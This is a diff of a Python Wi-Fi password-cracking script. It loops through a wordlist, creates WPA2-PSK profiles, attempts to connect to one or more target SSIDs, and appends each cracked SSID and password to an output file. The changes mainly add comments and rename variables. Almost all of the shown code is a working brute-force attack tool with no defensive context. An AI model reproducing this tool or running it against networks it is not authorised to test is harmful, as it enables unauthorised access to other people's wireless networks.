@@ -48,50 +48,68 @@ logging.basicConfig(
 # type = False
 
 def crack_password(wifi, ssid, password, number, verbose=False):
+    #
+    #   TODO: create_profile()
+    #
     profile = Profile()  # create profile instance
     profile.ssid = ssid  # name of client
     profile.auth = const.AUTH_ALG_OPEN  # auth algo
     profile.akm.append(const.AKM_TYPE_WPA2PSK)  # key management
     profile.cipher = const.CIPHER_TYPE_CCMP  # type of cipher
     profile.key = password  # use generated password
-
+    #
+    # TODO: reset_profiles()
+    #
     if verbose:
         print(DARK_GREEN)
         print(PLUS, f"[{number}] total network profiles: ", len(wifi.iface.network_profiles()))
         print(PLUS, f"[{number}] remove_all_network_profiles")
         wifi.iface.remove_all_network_profiles()  # remove all the profiles which are previously connected to device
         print(PLUS, f"[{number}] total network_profiles: ", len(wifi.iface.network_profiles()))
-
+    #
+    # TODO: add_profile()
+    #
     print(GREEN, end="")
-    print(PLUS, f"[{number}] creating profile:")
+    print(PLUS, f"[{number}] adding profile:")
     tmp_profile = wifi.iface.add_network_profile(profile)  # add new profile
-
+    #
+    # TODO: dump_profile()
+    #
     if verbose:
         print(DARK_GREEN)
         for var in vars(tmp_profile):
             print(f"{var:15}: {getattr(tmp_profile, var)}")
-
+    #
+    #   connect
+    #
     time.sleep(1)  # if script not working change time to 1 !!!!!!
     print(GREEN, end="")
     print(PLUS, f"[{number}] connecting...")
     wifi.iface.connect(tmp_profile)  # trying to Connect
     time.sleep(1)  # 1s
-
+    #
+    # wait and check
+    #
     if wifi.iface.status() == const.IFACE_CONNECTED:  # checker
+        #
+        # sucess
+        #
         time.sleep(1)
         print(BOLD, GREEN, '[*] Crack success!', RESET)
         print(BOLD, GREEN, '[*] password is ' + password, RESET)
         wifi.iface.disconnect()
         time.sleep(1)
-        # exit()
         return True
     else:
+        #
+        #   fail
+        #
         print(LIGHT_RED, '[{}] Crack Failed using {}'.format(number, password))
         return False
 
 
 # opening and reading the file
-def crack_loop(ssid, file, verbose=False):
+def crack_loop(ssid, password_file, output_file, verbose=False):
     wifi = helpers.wifi.Wifi(verbose)
 
     print(YELLOW)
@@ -105,26 +123,31 @@ def crack_loop(ssid, file, verbose=False):
         ssids = [ssid]
     print(ssids)
 
-    number = 0
-    words = get_filehandle(file)
+    attempts = 0
+    words = get_filehandle(password_file)
     for line in words:
-        number += 1
+        #   count attempts
+        attempts += 1
+        #   get next password
         try:
             # url / ssh
             pwd = line.decode('utf-8').strip().strip('\r').strip('\n')
         except:
             # file
             pwd = line.strip().strip('\r').strip('\n')
+        # loop over ssids
         for ssid in ssids:
             print(YELLOW)
-            print(f"[{number}] Trying {ssid} with {pwd}")
-            if crack_password(wifi, ssid, pwd, number, verbose=False):
-                print(DARK_WHITE, f"saving {ssid}:{pwd} to ../data/ssid-cracked.txt")
-                with open('../data/ssid-cracked.txt', 'a') as out:
+            print(f"[{attempts}] Trying {ssid} with {pwd}")
+            # try to crack
+            if crack_password(wifi, ssid, pwd, attempts, verbose=False):
+                # save cracked data
+                print(DARK_WHITE, f"saving {ssid}:{pwd} to {output_file}")
+                with open(output_file, 'a') as out:
                     out.write(f"{ssid}:{pwd}")
+                # update ssid list
                 print(f"removing {ssid} from loop")
                 ssids.remove(ssid)
-
     words.close()
 
 
@@ -133,7 +156,8 @@ def check_params():
     args = parser.parse_args()
 
     ssid = args.ssid
-    filee = args.file
+    password_file = args.password_file
+    output_file = args.output_file
     verbose = args.verbose
     all = args.all
     #
@@ -147,17 +171,18 @@ def check_params():
         ssid = "*ALL*"
 
     print(DARK_CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
-    print(CYAN, PLUS, f"ssid: {ssid}")
-    print(CYAN, PLUS, f"file: {filee}", RESET)
+    print(CYAN, PLUS, f"ssid         : {ssid}")
+    print(CYAN, PLUS, f"password file: {password_file}")
+    print(CYAN, PLUS, f"output_file  : {output_file}")
+    print(RESET)
     time.sleep(1.5)
-    return ssid, filee, verbose
+    return ssid, password_file, output_file, verbose
 
 
 if __name__ == '__main__':
     # Main function call
-    ssid, filee, verbose = check_params()
-    # wifi = helpers.wifi.Wifi(verbose)
-    crack_loop(ssid, filee, verbose)
+    ssid, password_file, output_file, verbose = check_params()
+    crack_loop(ssid, password_file, output_file, verbose)
 
 ###########################################################################################################################################################
 # END OF FILE
